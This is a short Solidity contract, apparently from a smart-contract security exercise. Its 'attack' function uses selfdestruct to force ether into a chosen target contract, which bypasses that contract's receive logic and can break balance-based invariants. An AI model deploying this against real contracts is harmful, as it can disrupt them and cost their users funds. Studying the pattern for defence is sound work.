// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
contract SelfDestructive {
    address private _owner;
    function attack(address contractAddress) public {
        selfdestruct(payable(contractAddress));
    }
    receive() external payable {
        _owner = msg.sender;
    }
}